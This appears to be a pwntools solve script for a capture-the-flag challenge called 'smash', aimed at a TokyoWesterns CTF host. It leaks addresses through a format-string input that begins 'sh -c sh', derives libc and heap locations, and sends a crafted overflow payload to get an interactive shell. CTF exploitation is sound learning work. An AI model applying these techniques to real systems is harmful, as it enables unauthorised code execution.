#!/usr/bin/env python3
from pwn import *

_FILE = "./smash"

binary = context.binary = ELF(_FILE, checksec=False)

env = {"LD_PRELOAD": ""} #"./libc-2.31.so"}
offset = 242 # 231 on glibc 2.27
one_gadget = 0xcda5a
if args.GDB:
    p = gdb.debug(_FILE, gdbscript="\nc\n", env=env)
elif args.REMOTE:
    offset = 237
    one_gadget = 0xe6ce3
    p = remote("pwn01.chal.ctf.westerns.tokyo", 29246)
else:
    p = process(_FILE, env=env)

_LIBC = ELF("./libc-2.31.so", checksec=False) if args.REMOTE else binary.libc

p.recvuntil("Input name > ")

p.sendline("sh -c sh "+"%p"*10)

leaks = p.recvuntil("OK?").decode("latin-1").split("\n")[0].split("-c sh")[1].split("0x")[:-1][1:]

print(leaks)
main_libc_addr = int(leaks[-1], 16)

main_addr = int(leaks[6], 16)-0xd

_LIBC.address = (main_libc_addr - offset) - _LIBC.sym["__libc_start_main"]
print(leaks[0])
heap_leak = int(leaks[0], 16)
log.info(f"libc addr {hex(_LIBC.address)}")
log.info(f"heap leak {hex(heap_leak)}")
log.info(f"main addr {hex(main_addr)}")
system = _LIBC.sym["system"]

p.recvuntil("[y/n] ")

p.sendline(b"y")

p.recvuntil("Input message > ")
input("ready?")

pop_rdi = main_addr + 0x1ca
log.info(f"sending {hex(heap_leak+0x30-40)}")
p.sendline(p64(main_addr + 0x105)+ cyclic(40, n=8) + p64(heap_leak+8)) #(p64(_LIBC.address + (0xe6ce6 if args.REMOTE else 0xcda5d))+ cyclic(40, n=8) + p64(heap_leak+0x30-40) + cyclic(1000, n=8)) #p64(main_addr)*(48//8) + p64(heap_leak+0x30)*100)

p.sendline(cyclic(1000, n=8))

p.interactive()
